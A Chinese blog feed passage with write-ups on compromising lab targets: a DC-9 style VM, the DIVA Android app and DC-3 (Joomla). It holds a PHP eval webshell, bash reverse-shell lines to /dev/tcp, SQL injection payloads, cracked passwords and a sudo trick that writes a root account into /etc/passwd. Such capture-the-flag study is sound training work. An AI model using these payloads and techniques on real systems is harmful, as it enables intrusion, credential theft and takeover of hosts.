class="line">&#x2F;web&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;www&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;php5&#x2F;php.ini</span><br><span class="line">&#x2F;xampp&#x2F;apache&#x2F;bin&#x2F;php.ini</span><br><span class="line">&#x2F;xampp&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">root&#x2F;.ssh&#x2F;identity</span><br><span class="line">root&#x2F;.ssh&#x2F;identity.pub</span><br><span class="line">root&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">root&#x2F;.ssh&#x2F;id_dsa.pub</span><br><span class="line">root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>丢bp里爆破，也没找到什么东西，</p>
<h2 id="knockd，ssh连接getshell"><a href="#knockd，ssh连接getshell" class="headerlink" title="knockd，ssh连接getshell"></a>knockd，ssh连接getshell</h2><p>还是去看别人的过程，要读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;knockd.conf</span><br></pre></td></tr></table></figure>
<p>这个文件，然后去查了一下这个玩意，大概是，要先访问sequence指定的端口，才会打开或者关闭对应的端口<br>比如这里，</p>
<p><img src="image-20210618103630995.png" alt="image-20210618103630995"></p>
<p>openSSH下面的sequence指定了7469,8475,9842三个端口，在不访问这几个端口前，直接ssh连接过去，是会被拒绝的</p>
<p><img src="image-20210618103806549.png" alt="image-20210618103806549"></p>
<p>但访问了这些端口后，这里我用的telnet</p>
<p>telnet 192.168.243.135 7469<br>telnet 192.168.243.135 8475<br>telnet 192.168.243.135 9842</p>
<p><img src="image-20210618103838621.png" alt="image-20210618103838621"></p>
<p><img src="image-20210618103858499.png" alt="image-20210618103858499"></p>
<p>就可以正常连接ssh（虽然现在还是不知道密码）<br>然后就去hydra里用找到的账号密码去爆破ssh密码了<br>[22][ssh] host: 192.168.243.135   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.243.135   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.243.135   login: janitor   password: Ilovepeepee</p>
<p>chandlerb<br>UrAG0D!</p>
<p>joeyt<br>Passw0rd</p>
<p>janitor<br>Ilovepeepee</p>
<p>在/var/www/html/config.php里找到了数据库密码<br>dbuser<br>password<br>没啥用的样子，<br>在/opt/devstuff下面发现有个python文件</p>
<p><img src="image-20210618130546428.png" alt="image-20210618130546428"></p>
<p>可以读写文件，试了一下写一个一句话到/var/html/www/bak<br>echo “<?php @eval($_POST[cmd]); ?>“ &gt; /tmp/shell.php<br>python test.py /tmp/shell.php  /var/www/html/bak.manage.php</p>
<p><img src="image-20210618133819795.png" alt="image-20210618133819795"></p>
<p>报错了。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在janitor下面发现了一个文本文件，里面有些密码</p>
<p><img src="image-20210618133916295.png" alt="image-20210618133916295"></p>
<p>拿出来，再去爆破一下，出来一个新用户，<br>[22][ssh] host: 192.168.243.135   login: fredf   password: B4-Tru3-001<br>fredf<br>B4-Tru3-001<br>果然，sudo -l发现它可以不用密码用sudo执行一个test文件，这里的看文件结构，应该是把test.py打包成了可执行文件，</p>
<p>这样子就可以向任意文件写入数据了<br>sudo ./test /tmp/shell.php  /var/www/html/bak.manage.php</p>
<p>所以这里我在tmp目录下写了一个shell。然后用test把它写入到index.php中，再用蚁剑连接上去</p>
<p><img src="image-20210618144957050.png" alt="image-20210618144957050"></p>
<p>(发现多此一举。: p)</p>
<p>直接写入一个用户到passwd文件里就行<br>    openssl passwd -1 -salt admin2 admin2</p>
<pre><code>$1$admin2$Pr1254RlLuWxoieYEI.Sa0
</code></pre>
<p>拼接好数据后，写入到/tmp/get文件里，（只有这里可以任意写文件）<br>    echo ‘admin2:$1$admin2$Pr1254RlLuWxoieYEI.Sa0:0:0::/:/bin/bash’ &gt; /tmp/get</p>
<p>然后用test写入到passwd<br>    sudo /opt/devstuff/dist/test/test /tmp/get /etc/passwd</p>
<p>之后直接su admin2<br>切换过去，就可以看到flag了</p>
<p><img src="image-20210618155522983.png" alt="image-20210618155522983"></p>
<p>可能是因为是最后一个靶机，最后的结束语都有些不一样</p>
<p>So long, and thanks for all the fish.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于粗心，注入的时候没有第一时间找到各个用户的密码，导致后面ssh爆破的时候傻乎乎的花了很多时间，过于粗心。文件包含这个很早就注意过了，但是却没有想到去文件包含（他已经考过一次），后面提权的时候，直接写入passwd文件创建用户，这一点以前没有碰过。</p>
]]></content>
  </entry>
  <entry>
    <title>DIVA学习记录</title>
    <url>/2021/08/03/DIVA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-This-is-Y/</url>
    <content><![CDATA[<h1 id="1-insecre-logging"><a href="#1-insecre-logging" class="headerlink" title="1. insecre logging"></a>1. insecre logging</h1><p><strong>Objective</strong>: Find out what is being logged where/how and the vulnerable code<br><strong>Hint</strong>: Insecure logging occurs when developers intentionally or unintentionally log sensitive information such as credentials, session IDs, financial details etc.<br><strong>目标</strong>。找出被记录的地方/方式以及易受攻击的代码<br><strong>提示</strong>：当开发人员有意或无意地记录敏感信息，如证书、会话ID、财务细节等，就会出现不安全的记录。</p>
<p>命令行使用ADB查看日志<br>首先查看设备，<br>D:\Program_Files\Nox\bin\nox_adb.exe devices</p>
<p><img src="image-20210803111052967.png" alt="image-20210803111052967"></p>
<p>然后连接，使用参数logcat查看日志<br>    D:\Program_Files\Nox\bin\nox_adb.exe -s 127.0.0.1:62001 logcat<br>App端输入数据，在日志中可以实时看到输入的数据</p>
<p> <img src="image-20210803111056943.png" alt="image-20210803111056943"></p>
<h1 id="2-hardcoding-issues-part1"><a href="#2-hardcoding-issues-part1" class="headerlink" title="2. hardcoding issues part1"></a>2. hardcoding issues part1</h1><p><strong>Objective</strong> : Find out what is hardcoded and where .<br><strong>Hint</strong> :Developers sometimes will hardcode sensitive information for ease .<br><strong>目标</strong>：找出什么是硬编码，在哪里。<br><strong>提示</strong>：为了方便起见，开发人员有时会将敏感信息硬编码。</p>
<p>所谓的硬编码就是把字符串，Key，加密用的Salt写死在代码上<br>所以这里需要把APP反编译一下，使用工具jadx：<a class="link" href="https://github.com/skylot/jadx">https://github.com/skylot/jadx<i class="fas fa-external-link-alt"></i></a><br>反编译程序，找到hardcode这一关的代码，<br><img src="image-20210803111138560.png" alt="image-20210803111138560">                            </p>
<p>可以看到一个if判断，判断的对象直接写死在表达式中，vendorsecretkey</p>
<p><img src="image-20210803111154758.png" alt="image-20210803111154758"><img src="image-20210803111202933.png" alt="image-20210803111202933"></p>
<h1 id="3-insecure-data-Storage-part1"><a href="#3-insecure-data-Storage-part1" class="headerlink" title="3. insecure data Storage part1"></a>3. insecure data Storage part1</h1><p><strong>Objective</strong> : Find out where / how the credentials are being stored and the vulnerable code<br><strong>Hint</strong> ：Insecure data storage is the result of storing confidential information insecurely on the system i.e. poor encryption, plain text,access control issues etc<br><strong>目标</strong>：找出凭证的存储位置/方式以及有漏洞的代码。脆弱的代码<br><strong>提示</strong>: 不安全的数据存储是指在系统中不安全地存储机密信息的结果。不安全的数据存储是指在系统中不安全地存储机密信息的结果，即糟糕的加密，纯文本。 访问控制问题等</p>
<p>由于上一关反编译了，这里直接看源码，</p>
<p><img src="image-20210803111236193.png" alt="image-20210803111236193"></p>
<p>使用的是SharedPreferences存储，没有加密，这个文件在系统目录中，安装root explorer.打开root,赋予root权限。</p>
<p><img src="image-20210803111242277.png" alt="image-20210803111242277"></p>
<p>文件存在/data/data/jakhar.aseem.diva/shared_prefs目录下的xml文件中</p>
<p><img src="image-20210803111249042.png" alt="image-20210803111249042"><img src="image-20210803111253944.png" alt="image-20210803111253944"></p>
<p>输入的数据明文存储与xml文件里</p>
<h1 id="4-insecure-data-Storage-part2"><a href="#4-insecure-data-Storage-part2" class="headerlink" title="4. insecure data Storage part2"></a>4. insecure data Storage part2</h1><p>看代码可知，这次的数据存在数据库中，代码里创建了一个叫IDS的数据库</p>
<p><img src="image-20210803111352355.png" alt="image-20210803111352355"></p>
<p>App的数据库使用的都是sqlite，数据库文件存在/data/data/jakhar.aseem.diva/databases，文件名就是数据库名</p>
<p><img src="image-20210803111358956.png" alt="image-20210803111358956"><img src="image-20210803111401852.png" alt="image-20210803111401852"></p>
<p>查看数据</p>
<p><img src="image-20210803111409690.png" alt="image-20210803111409690"></p>
<p>同时因为涉及到数据库，而参数没有过滤，这个语句存在sql注入，<br>Paylaod：<br>123’, sqlite_version() ,(‘123<br>123’,(select name from sqlite_master limit 0,1)),(‘123<br>123’,(select sql from sqlite_master limit 0,1)),(‘123</p>
<p><img src="image-20210803111436720.png" alt="image-20210803111436720"><img src="image-20210803111439882.png" alt="image-20210803111439882"></p>
<h1 id="5-insecure-data-Storage-part3"><a href="#5-insecure-data-Storage-part3" class="headerlink" title="5. insecure data Storage part3"></a>5. insecure data Storage part3</h1><p>这个的数据使用createTempFile方法创建一个临时文件来存储数据，后面的getApplicationInfo().dataDir的路径为/data/user/0/jakhar.aseem.diva</p>
<p>关于路径的解读：<a class="link" href="https://blog.csdn.net/xiaol206/article/details/80149467">https://blog.csdn.net/xiaol206/article/details/80149467<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20210803113613356.png" alt="image-20210803113613356"></p>
<p><img src="image-20210803113621259.png" alt="image-20210803113621259"><img src="image-20210803113625254.png" alt="image-20210803113625254"></p>
<h1 id="6-insecure-data-Storage-part4"><a href="#6-insecure-data-Storage-part4" class="headerlink" title="6. insecure data Storage part4"></a>6. insecure data Storage part4</h1><p>这个使用的同样是文件存储，在/storage/emulated/0目录下，创建一个.uinfo.txt来存放数据。要查看这个数据甚至不需要root</p>
<p><img src="image-20210803113657109.png" alt="image-20210803113657109"></p>
<p><img src="image-20210803113701931.png" alt="image-20210803113701931"><img src="image-20210803113704599.png" alt="image-20210803113704599"><img src="image-20210803113708214.png" alt="image-20210803113708214"></p>
<h1 id="7-Input-validation-issues-part1"><a href="#7-Input-validation-issues-part1" class="headerlink" title="7. Input validation issues part1"></a>7. Input validation issues part1</h1><p><strong>Objective</strong>: Try to access all user data without knowing any user name.there are three users by default and your task is to output data of he three users with a single malicious search<br><strong>Hint</strong> : Improper or no input validation issue arise when the input is not filtered or validated before using it. When developing components that take input from outside, always validate it. For ease of testing there are three users already present in the database , for example one of them is admin, you can try searching for admin to test the output.<br><strong>目标</strong>:尝试在不知道任何用户名的情况下访问所有用户数据。默认情况下有三个用户，您的任务是通过一次恶意搜索输出三个用户的数据<br><strong>提示</strong>:当输入在使用之前没有被过滤或验证时，会出现不正确或没有输入验证的问题。当开发从外部获取输入的组件时，始终要对其进行验证。为了便于测试，数据库中已经有三个用户，例如其中一个是admin，您可以尝试搜索admin来测试输出。</p>
<p>这一关需要查出数据库里的信息，应该就是一个sql注入简单测试了一下，<br>Payload：-1’or ‘1’=’1<br><img src="image-20210803113724662.png" alt="image-20210803113724662"></p>
<h1 id="8-Input-validation-issues-part2"><a href="#8-Input-validation-issues-part2" class="headerlink" title="8. Input validation issues part2"></a>8. Input validation issues part2</h1><p><strong>Objective</strong>: Try accessing any sensitive information apart from a web URL<br>Hint: Improper or no input validation issue arise when the input is not filtered or validated before using it. When developing components that take input from outside , always validate it .<br><strong>目标</strong>：尝试访问任何敏感信息，除了网络URL之外。<br><strong>提示</strong>：当输入在使用前没有被过滤或验证时，就会出现不适当或没有输入验证的问题。当开发从外部获取输入的组件时，一定要对其进行验证。</p>
<p>这关的目标是尝试访问除了网络URL之外的任何敏感信息。感觉就是web方面的本地文件包含<br>这个功能点是要获取web路径，所以应该是用的webview，既然要访问本地信息，可以用<a class="link" href="file://协议">file://协议<i class="fas fa-external-link-alt"></i></a>，然后试着获取一下上上关生成的文件<br>file:///storage/emulated/0/.uinfo.txt</p>
<p><img src="image-20210803113828397.png" alt="image-20210803113828397"></p>
<p>后面看一下代码，发现整个功能点就一句话</p>
<p><img src="image-20210803113837415.png" alt="image-20210803113837415"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">((WebView) findViewById(R.id.ivi2wview)).loadUrl(((EditText) findViewById(R.id.ivi2uri)).getText().toString()); </span><br></pre></td></tr></table></figure>



<h1 id="9-Access-control-issues-part1"><a href="#9-Access-control-issues-part1" class="headerlink" title="9. Access control issues part1"></a>9. Access control issues part1</h1><p><strong>Objective</strong> : You are able to access the API credentials when you click the button . Now , try to access the API credentials from outside the app .<br>Hint: Components of an app can be accessed from other apps or users if they are not properly protected. Components such as activities,services, content providers are prone to this.<br><strong>目标</strong>：当你点击按钮时，你能够访问API凭证。现在，尝试从应用程序外部访问API凭证。<br><strong>提示</strong>：如果一个应用程序的组件没有得到适当的保护，它们可以被其他应用程序或用户访问。诸如活动、服务、内容提供者等组件很容易出现这种情况。</p>
<p>这关要求不点按钮查看到证书内容，这关不会，学习一下方法<br>组件情况<br><img src="image-20210803113914916.png" alt="image-20210803113914916"><br>关键组件jakhar.aseem.diva.APICredsActivity<br><img src="image-20210803113922160.png" alt="image-20210803113922160"><br>命令行<br>D:\Program_Files\Nox\bin\nox_adb.exe -s 127.0.0.1:62026 shell am start -n jakhar.aseem.diva/.APICredsActivity<br>命令：adb shell am start -n 包名/包名.MainActivity</p>
<ul>
<li>参数：<ul>
<li>adb shell: 进入手机shell模式</li>
<li>am: activity 管理工具 </li>
<li>start: 启动activity</li>
</ul>
</li>
</ul>
<p>执行完命令后，app就出现了之前的页面。<br>关于adb命令：<a class="link" href="https://blog.csdn.net/bin470398393/article/details/81939485">https://blog.csdn.net/bin470398393/article/details/81939485<i class="fas fa-external-link-alt"></i></a><br><img src="image-20210803113938725.png" alt="image-20210803113938725"></p>
<h1 id="10-Access-control-issues-part2"><a href="#10-Access-control-issues-part2" class="headerlink" title="10. Access control issues part2"></a>10. Access control issues part2</h1><p><strong>Objective</strong> : You are able to access the Third Party app TVEETER APIcredentials after you have registered with Tveeter. The App requests youto register online and the vendor gives you a pin , which you can use toregister with the app . Now , try to access the API credentials fromoutside the app without knowing the PIN. This is a business logicproblem so you may need to see the code.<br>Hint: Components of an app can be accessed from other apps or usersif they are not properly protected and some may also accept externalinputs. Components such as activities, services, content providers areprone to this .<br><strong>目标</strong>：您在Tveeter注册后，可以访问第三方应用程序TVEETER APIcredentials。该应用程序要求您在线注册，供应商会给您一个密码，您可以用它来注册该应用程序。现在，尝试在不知道PIN码的情况下从应用程序外部访问API凭证。这是一个业务逻辑问题，所以你可能需要查看代码。<br><strong>提示</strong>：如果一个应用程序的组件没有得到适当的保护，它们可以被其他应用程序或用户访问，有些还可能接受外部输入。诸如活动、服务、内容提供者等组件很容易出现这种情况。</p>
<p>要求和上一关一样，不过多了一个pin码。看一眼文件</p>
<p><img src="image-20210803114206218.png" alt="image-20210803114206218"></p>
<p>同样是跳转到一个新的activity，不过同时会传递一个参数，参数名使用getString(R.string.chk_pin)获得，参数值由radiobutton组件决定，类型为boolean。所以需要知道R.string.chk_pin的值是什么，这块想了很久，无果，去查了一下，这个值在res/values/string.xml里存着，</p>
<p><img src="image-20210803114215566.png" alt="image-20210803114215566"></p>
<p>Chk_pin的值为check_pin,所以传递的代码是putExtra(“check_pin”, chk_pin)<br>而这个值，在下一个activity中，决定了是否会显示APIKEY，所以用adb控制，启动新的activity，同时带上参数，<br>Payload:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">D:\Program_Files\Nox\bin\nox_adb.exe <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">62026</span> shell am <span class="built_in">start</span> <span class="literal">-n</span> jakhar.aseem.diva/.APICreds2Activity -<span class="literal">-ez</span> check_pin <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20210803114334516.png" alt="image-20210803114334516"></p>
<p>关于命令：<a class="link" href="https://blog.csdn.net/luguangxu68/article/details/99828329">https://blog.csdn.net/luguangxu68/article/details/99828329<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="11-Access-control-issues-part3"><a href="#11-Access-control-issues-part3" class="headerlink" title="11. Access control issues part3"></a>11. Access control issues part3</h1><p><strong>Objective</strong>: This is a private notes application. You can create a PIN onceand access your notes after entering the correct pin. Now, try to accessthe private notes from outside the app without knowing the PIN.<br><strong>Hint</strong>:Components of an app can be accessed from other apps or usersif they are not properly protected and some may also accept externalinputs. Components such as activities, services, content providers areprone to this.</p>
<p><strong>目标</strong>：这是一个私人笔记应用程序。你可以创建一个密码，并在输入正确的密码后访问你的笔记。现在，尝试在不知道PIN码的情况下从应用程序外部访问私人笔记。<br><strong>提示</strong>：如果应用程序的组件没有得到适当的保护，它们可以被其他应用程序或用户访问，有些还可能接受外部输入。诸如活动、服务、内容提供者等组件很容易出现这种情况。</p>
<p>这关是有一个有密码的笔记本，试着在不知道密码的情况下访问私人笔记</p>
<p>估计同样是组件问题，和前两个一样。分析了一下代码，直接看的第二个activity，发现if判断的时候，有用到Preference，猜测是把pin存在Preference里了，所以回去看第一个activity，果不其然。</p>
<p><img src="image-20210803114351040.png" alt="image-20210803114351040"></p>
<p>打开/data/data/jakhar.aseem.diva/shared_prefs，打开xml文件，pin码就躺在里面</p>
<p><img src="image-20210803114404975.png" alt="image-20210803114404975"></p>
<p>直接输入pin查看数据</p>
<p><img src="image-20210803114412950.png" alt="image-20210803114412950"></p>
<p>然而这不行，这关要求是尝试在不知道PIN码的情况下从<strong>应用程序外部</strong>访问私人笔记。<br>从头开始，分析一下从数据库中查表的代码，发现有用到一个查询语句是这样子写的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">query(NotesProvider.CONTENT_URI, new String[]&#123;&quot;_id&quot;, &quot;title&quot;, &quot;note&quot;&#125;, null, null, null),</span><br></pre></td></tr></table></figure>
<p>就去查了一下NotesProvider.CONTENT_URI,<br>资料：<a class="link" href="https://blog.csdn.net/luoqingyan/article/details/107617479">https://blog.csdn.net/luoqingyan/article/details/107617479<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell content query --uri &lt;URI&gt;</span><br></pre></td></tr></table></figure>
<p>要查询的话，需要知道uri，资源的位置，现在只知道整个uri使用content://开头的。用jadx搜索整个项目文件，</p>
<p><img src="image-20210803114529825.png" alt="image-20210803114529825"></p>
<p><img src="image-20210803114534691.png" alt="image-20210803114534691"></p>
<p>content://jakhar.aseem.diva.provider.notesprovider/notes<br>找到一个，adb下面试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\Program_Files\Nox\bin\nox_adb.exe -s 127.0.0.1:62026 shell content query --uri content:&#x2F;&#x2F;jakhar.aseem.diva.provider.notesprovider&#x2F;notes</span><br></pre></td></tr></table></figure>
<p><img src="image-20210803114549249.png" alt="image-20210803114549249"></p>
<h1 id="12-hardcoding-issues-part2"><a href="#12-hardcoding-issues-part2" class="headerlink" title="12. hardcoding issues part2"></a>12. hardcoding issues part2</h1><p>又是一个硬编码问题。这次没有直接写在activity里，</p>
<p><img src="image-20210803114630720.png" alt="image-20210803114630720"></p>
<p>又是一个没见过的东西。仔细看了一眼，这看上去想作者自己写的，divaJni，再去全局查了一下</p>
<p><img src="image-20210803114636348.png" alt="image-20210803114636348"></p>
<p>有个类的定义，内容大概就是加载了一个文件</p>
<p><img src="image-20210803114640945.png" alt="image-20210803114640945"></p>
<p>查了一下<a class="link" href="https://blog.csdn.net/teleger/article/details/82052314%EF%BC%8Cloadlibrary%E4%BC%9A%E5%9C%A8">https://blog.csdn.net/teleger/article/details/82052314，loadlibrary会在<i class="fas fa-external-link-alt"></i></a><br> /system/lib<br> /data/data/xxx apk package/lib<br>两个目录下查找该so库，所以去/data/data/jakhar.aseem.diva/lib下面找了一下，发现有个叫libdivajni.so的文件，用IDA打开，虽然看不明白汇编代码，但是好在代码量不是很多，把长得像密钥的字符一个一个试过去，最后找到了这个</p>
<p>olsdfgad;lh</p>
<p><img src="image-20210803114647880.png" alt="image-20210803114647880"></p>
<h1 id="13-Input-validation-issues-part3"><a href="#13-Input-validation-issues-part3" class="headerlink" title="13. Input validation issues part3"></a>13. Input validation issues part3</h1><p><strong>Objective</strong> : This is a Missile Launch App . Spread love not War ! DOS theDamn thing ! Your objective here is to NOT find the code and then launchthe missiles, rather it is to crash the app (and then find the root causethe crash ) .<br>Hint: Improper or no input validation issue arise when the input is nofiltered or validated before using it. When developing components thattake input from outside, always validate it. This is a classic memorycorruption vulnerability. If you can get code execution, I would love tohear from you . I dont expect anyone to go that far though .<br><strong>目标</strong>:这是一个导弹发射应用程序。传播爱而不是战争!该死的东西!你的目标不是找到代码然后发射导弹，而是让应用崩溃(然后找到崩溃的根本原因)。<br><strong>提示</strong>:当在使用输入之前没有过滤或验证输入时，会出现不正确或没有输入验证的问题。当开发从外部获取输入的组件时，总是要验证它。这是一个典型的内存破坏漏洞。如果你能执行代码，我很乐意听到你的消息。但我不指望任何人走得那么远。</p>
]]></content>
  </entry>
  <entry>
    <title>DC-3 靶机</title>
    <url>/2020/07/15/DC-3%20%E9%9D%B6%E6%9C%BA-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13308122.html">源地址：https://www.cnblogs.com/This-is-Y/p/13308122.html<i class="fas fa-external-link-alt"></i></a></p>
<p>靶机来源：<a class="link" href="https://www.five86.com/">https://www.five86.com<i class="fas fa-external-link-alt"></i></a></p>
<p>vmbox安装，启动。kali启动</p>
<p>靶机使用的是桥接模式，物理机确定网段192.168.123.0</p>
<p>nmap -sP 192.168.123.0/24</p>
<p>扫描存活主机，确定ip</p>
<img src="1503868-20200715210704732-1413986865.png" alt loading="lazy">

<p>192.168.123.27</p>
<p>浏览器插件wappalyzer确定了cms是Joomla</p>
<img src="1503868-20200715210745080-1235304051.png" alt loading="lazy">

<p> dirsearch扫描一下</p>
<img src="1503868-20200716220830338-886184025.png" alt loading="lazy">

<p> </p>
<p> 后台：<a class="link" href="http://192.168.123.27/administrator/index.php">http://192.168.123.27/administrator/index.php<i class="fas fa-external-link-alt"></i></a></p>
<p>上网查了查这个，joomla，是国外一个挺不错的cms，也查到在Joomla!3.7.0中是存在注入的，找到一篇文章讲这个注入的，看不懂大佬写的，就拿最后的POC直接上了</p>
<p><a class="link" href="https://www.cnblogs.com/yangxiaodi/p/6874314.html">https://www.cnblogs.com/yangxiaodi/p/6874314.html<i class="fas fa-external-link-alt"></i></a></p>
<p>确定目前的靶机是存在这个漏洞的</p>
<p><a class="link" href="http://192.168.123.27/**index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml(0x3a,concat(1,(select%20md5(1))),1">http://192.168.123.27/**index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x3a,concat(1,(select%20md5(1))),1<i class="fas fa-external-link-alt"></i></a>)**</p>
<img src="1503868-20200717152922419-2146981945.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 然后用sqlmap跑，前面都还正常，都跑出来了，然后发现一个表#__users，在我想跑这个表的信息的时候，却出了点问题</p>
<img src="1503868-20200717153311755-1655767929.png" alt loading="lazy">

<p> </p>
<p> sqlmap死活说找不到这个表</p>
<img src="1503868-20200717153508444-1513768408.png" alt loading="lazy">

<p>死活找不到。明明没问题。</p>
<p> 后来才知道，关于这个漏洞，网上有人写了专门的POC，<a class="link" href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py">点这里<i class="fas fa-external-link-alt"></i></a></p>
<p>使用很简单，直接在命令行下用python2运行就好了</p>
<img src="1503868-20200717155007237-1047823015.png" alt loading="lazy">

<p> </p>
<p>关于查找cms漏洞这一步，在kali下有对joomla的专门的扫描工具。joomscan。和wordpress的wpscan一样。可以查到后台，版本等，拿到版本后可以用searchsploit来查找cms漏洞</p>
<img src="1503868-20200718102200151-854418383.png" alt loading="lazy">

<p> </p>
<img src="1503868-20200718102234842-1979193735.png" alt loading="lazy">

<p> </p>
<p>之后就可以通过后面的目录</p>
<p>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt <br>这个文件来看该漏洞的详细信息<br><br></p>
<p> </p>
<p>这边就可以直接得到有用信息，后台用户名密码，关于密码，采用johnny，把密码写入到一个文件中，启动johnny，添加文件，执行，可以自动识别加密方式以及解密。当然也可以直接用john the ripper</p>
<img src="1503868-20200717155253930-792047065.png" alt loading="lazy">

<p>解出来结果是snoopy。登陆后台</p>
<p> </p>
<p>登陆后，</p>
<img src="1503868-20200718102718059-2001477480.png" width="1000" loading="lazy">

<p> </p>
<p> <img src="1503868-20200718102724037-336896396.png" width="1000" loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20200718102758669-1145623367.png" width="1000" loading="lazy"></p>
<p> </p>
<p> 在这里可以随意添加文件，上传一个简单的webshell上去，用蚁剑连接，</p>
<p>至于目录。</p>
<p>ip/templates/beez3/自己建立的文件目录</p>
<p>或ip/templates/protostar/自己建立的文件目录</p>
<p>连上蚁剑后，打开terminal，开始<a class="link" href="https://choge.top/2020/02/23/%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/">反弹shell<i class="fas fa-external-link-alt"></i></a></p>
<p>kali ： nc -lvp 9966</p>
<p>terminal ： bash -i &gt;&amp; /dev/tcp/192.168.87.130/9966 0&gt;&amp;1</p>
<p>但是出了点问题，</p>
<img src="1503868-20200718104051487-280731378.png" alt loading="lazy">

<p>（新修改：</p>
<p>解决方式：bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.123.41/1234 0&gt;&amp;1’  （这边kali的ip变了，是因为换到了桥接模式）</p>
<p>可以成功反弹，尽管还是报错了，但是kali有反应</p>
<img src="1503868-20200719100239939-1331765001.png" alt loading="lazy">

<p> <img src="1503868-20200719100302676-634257379.png" alt loading="lazy"></p>
<p>）</p>
<p> 换个方式反弹，写一个php文件进去，执行，发现也是不行，报错：{“code”:”ECONNABORTED”,”timeout”:5000}</p>
<img src="1503868-20200718170446980-2131410240.png" alt loading="lazy">

<p> 后面感觉应该是网段原因，就把kali切换到桥接模式，再试一次，虽然还是会报这个错，但是kali那边已经有反应了</p>
<p> </p>
<p>到kali后，开始提权</p>
<p>查看linux的版本信息</p>
<p>lsb_release -a</p>
<p>uname -a</p>
<img src="1503868-20200719100558386-416502696.png" alt loading="lazy">

<img src="1503868-20200719101750018-952417125.png" alt loading="lazy">

<p> 在kali用searchsploit搜索该版本（Ubuntu 16.04 ）的有关漏洞</p>
<p>这样就找到了3个合适的漏洞</p>
<img src="1503868-20200719101932763-1952021340.png" alt loading="lazy">

<p> </p>
<p> 一个一个来试</p>
<p><strong>第一个：</strong></p>
<p>cat /usr/share/exploitdb/exploits/linux_x86-64/local/40049.c <br>查看详情，这个是在exploit-db上的对应链接： <a class="link" href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049<i class="fas fa-external-link-alt"></i></a></p>
<p>使用方法：</p>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA5AAAAHgCAIAAABckxWbAAAYLWlDQ1BJQ0MgUHJvZmlsZQAAWIWVeQk4Vd/X/z733MnlmudZZjLPJPM8z0Mq1zzTNUWRkAyVZEghhUSKRlNChpRkylCKFEKpVIZMeQ+q7+/9vv/n/z7vfp59zueuvfban7X32nvfdS8AHKykkJAAFC0AgUFhZGsDbV5HJ2de3DjAAlYAgCAQJ7mHhmhZWpoin8Cf938vS0MA2nq/kNiy9T/b/7+FzsMz1B0AyBLBbh6h7oEIvgcAmt09hBwGAKYXkfNHhoVs4QUEM5IRggBg8VvYewdzbmG3HSy9rWNrrYNgXQDwVCQS2RsA6i37vBHu3ogd6hCkjT7IwzcIUU1E8F53H5IHAOxtiM7uwMDgLTyPYBG3/7Dj/d9suv21SSJ5/8U7vmwXvK5vaEgAKer/OB3/ewkMCP8zxi6kUvmQDa23fEbmrcw/2GQLUyG4IcjN3ALB9Ah+4uuxrb+FR3zCDe1+68+5h+ogcwaYAUABD5KuCYKRuUQxh/vbaf3GsiTydl9EH2XuG2Zk+xu7kYOtf9tHRQQFmJv+tpPs42n0B1/yDNWz+aPj5atvhGAk0lD3on1sHXZ4otoifO3NEUyN4N5QfxuT333Hon10zP/okMOttzgLIHjBi6xvvaMDswaG/vELlnQnbY+FRC2sGeZja7jTF3b0DHU0/cPBw1NXb4cD7OEZZPebG4xEl7b1775JIQGWv/XhS54BBtY78wzfCo2w+dO3PwwJsJ15gN/7kYwtd/jDSyFhlrY73NBoYAp0gC7gBeFIdQPBwA/4ds/VzCGfdlr0AQmQgTfwBBK/JX96OGy3BCFPGxANPiPIE4T+7ae93eoJIhD5xl/pzlMCeG23Rmz38AcfEByIZkfvRauhTZGnJlJl0cpolT/9eGn+jIrVw+piDbH6WNG/PNwR1gFIJQPf/4fMBHl7It5tcQn648M/9jAfMH2Y95hBzDjmFbAHk9tWfmsd9I0n/4s5LzAD44g1/d/euSE2Z//ooIUQ1gpobbQ6wh/hjmZGswMJtDziiRZaA/FNAZH+J8Pwv9z+mct/j7fF+j/9+S2nFqNW+M3C7e/K6PzV+rcVnf+YIw/kbfJvTTgZvgt3wI/gp3A